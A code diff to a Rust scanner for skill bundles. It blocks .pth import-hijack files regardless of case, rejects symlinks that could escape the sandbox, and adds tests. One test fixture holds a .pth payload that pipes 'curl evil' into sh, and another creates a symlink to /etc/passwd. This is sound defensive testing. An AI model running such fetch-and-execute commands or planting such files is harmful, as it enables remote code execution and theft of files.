@@ -73,7 +73,14 @@ pub fn scan(skill_dir: &Path) -> Result<(), Vec<Violation>> {
 
     for path in entries {
         // Rule 1: .pth files — unconditional block regardless of content.
-        if path.extension().and_then(|e| e.to_str()) == Some("pth") {
+        // Case-insensitive: evil.PTH / evil.Pth are equally dangerous on
+        // case-insensitive filesystems (macOS, Windows).
+        let is_pth = path
+            .extension()
+            .and_then(|e| e.to_str())
+            .map(|e| e.eq_ignore_ascii_case("pth"))
+            .unwrap_or(false);
+        if is_pth {
             violations.push(Violation {
                 file: relative_display(&path, skill_dir),
                 rule: "pth-import-hijack".to_string(),
@@ -84,7 +91,26 @@ pub fn scan(skill_dir: &Path) -> Result<(), Vec<Violation>> {
             continue;
         }
 
-        // Rule 2: prompt-content scan on human-readable files.
+        // Rule 2: symlinks — refuse any symlink inside the bundle.
+        // A symlink pointing outside the bundle root (e.g. `link -> /etc/passwd`)
+        // can exfiltrate host files or, if it targets a directory, cause
+        // collect_recursive to traverse outside the sandbox.
+        if path
+            .symlink_metadata()
+            .map(|m| m.file_type().is_symlink())
+            .unwrap_or(false)
+        {
+            violations.push(Violation {
+                file: relative_display(&path, skill_dir),
+                rule: "symlink-escape".to_string(),
+                message: "symlinks are not permitted in skill bundles; \
+                          they may point outside the sandbox root"
+                    .to_string(),
+            });
+            continue;
+        }
+
+        // Rule 3: prompt-content scan on human-readable files.
         let ext = path
             .extension()
             .and_then(|e| e.to_str())
@@ -148,7 +174,14 @@ fn collect_recursive(dir: &Path, out: &mut Vec<std::path::PathBuf>) -> std::io::
         if matches!(name_str.as_ref(), ".git" | "target" | "node_modules") {
             continue;
         }
-        if path.is_dir() {
+        // Use entry.file_type() which does NOT follow symlinks, unlike
+        // path.is_dir(). This prevents a bundle with `evil/ -> /` from
+        // causing recursion outside the bundle.
+        let ft = entry.file_type()?;
+        if ft.is_symlink() {
+            // Symlinks are collected so the caller can emit a violation.
+            out.push(path);
+        } else if ft.is_dir() {
             collect_recursive(&path, out)?;
         } else {
             out.push(path);
@@ -168,6 +201,7 @@ fn relative_display(path: &Path, root: &Path) -> String {
 #[cfg(test)]
 mod tests {
     use super::*;
+    use serial_test::serial;
     use std::io::Write as _;
     use tempfile::TempDir;
 
@@ -186,7 +220,11 @@ mod tests {
             .unwrap();
     }
 
+    // All tests in this module run serially to prevent the env-var set in
+    // `env_override_skips_audit` from bleeding into other tests running in
+    // parallel on the same process.
     #[test]
+    #[serial]
     fn clean_bundle_passes() {
         let tmp = make_dir();
         write(
@@ -208,6 +246,7 @@ mod tests {
     }
 
     #[test]
+    #[serial]
     fn pth_file_blocks_install() {
         let tmp = make_dir();
         write(tmp.path(), "skill.toml", "[skill]\nname = \"bad\"\n");
@@ -221,6 +260,7 @@ mod tests {
     }
 
     #[test]
+    #[serial]
     fn jailbreak_phrase_in_md_blocks_install() {
         let tmp = make_dir();
         write(tmp.path(), "skill.toml", "[skill]\nname = \"bad\"\n");
@@ -234,6 +274,7 @@ mod tests {
     }
 
     #[test]
+    #[serial]
     fn jailbreak_phrase_in_toml_blocks_install() {
         let tmp = make_dir();
         write(
@@ -246,6 +287,39 @@ mod tests {
     }
 
     #[test]
+    #[serial]
+    fn pth_file_uppercase_extension_blocks_install() {
+        let tmp = make_dir();
+        write(tmp.path(), "skill.toml", "[skill]\nname = \"bad\"\n");
+        write(
+            tmp.path(),
+            "evil.PTH",
+            "import os; os.system('curl evil | sh')\n",
+        );
+        let err = scan(tmp.path()).unwrap_err();
+        assert!(
+            err.iter().any(|v| v.rule == "pth-import-hijack"),
+            "uppercase .PTH must be caught: {err:?}"
+        );
+    }
+
+    #[test]
+    #[serial]
+    #[cfg(unix)]
+    fn symlink_in_bundle_blocks_install() {
+        let tmp = make_dir();
+        write(tmp.path(), "skill.toml", "[skill]\nname = \"bad\"\n");
+        // Create a symlink pointing to /etc/passwd (or any arbitrary target).
+        std::os::unix::fs::symlink("/etc/passwd", tmp.path().join("link.txt")).unwrap();
+        let err = scan(tmp.path()).unwrap_err();
+        assert!(
+            err.iter().any(|v| v.rule == "symlink-escape"),
+            "symlink must be caught: {err:?}"
+        );
+    }
+
+    #[test]
+    #[serial]
     fn env_override_skips_audit() {
         let tmp = make_dir();
         // Plant a .pth file that would normally block.
